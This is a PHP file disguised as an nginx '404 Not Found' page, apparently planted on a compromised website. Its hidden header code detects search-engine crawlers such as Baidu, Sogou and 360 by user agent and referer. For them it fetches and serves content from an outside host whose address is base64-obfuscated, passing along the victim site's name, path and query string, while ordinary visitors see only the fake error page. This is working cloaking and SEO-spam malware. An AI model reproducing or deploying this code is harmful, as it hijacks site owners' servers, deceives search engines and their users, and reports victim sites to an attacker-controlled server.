<?php
header('Content-Type:text/html;charset=gb2312');
$key= $_SERVER["HTTP_USER_AGENT"].$_SERVER["HTTP_REFERER"];
if(strpos($key,'Sogou')!== false||strpos($key,'Baiduspider')!==false||strpos($key,'baidu')!==false||strpos($key,'360')!==false||strpos($key,'haosou')!==false)
{
   $host_name = "http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
   $file = file_get_contents(base64_decode("aHR0cDovL3M2OC5tbTY4NjhzLnh5ei8=").base64_decode("L2luZGV4LnBocD9ob3N0PQ==").$host_name."&url=" . $_SERVER['QUERY_STRING'] . "&domain=" . $_SERVER['SERVER_NAME']); 
   echo $file;
return ;
}
?>

【已下可以转换】
<html>
<title>404 Not found</title>


<body bgcolor="white">
<center>
<h1>404 Not Found</h1>
</center>
<hr>
<center>nginx</center>
</body>
</html>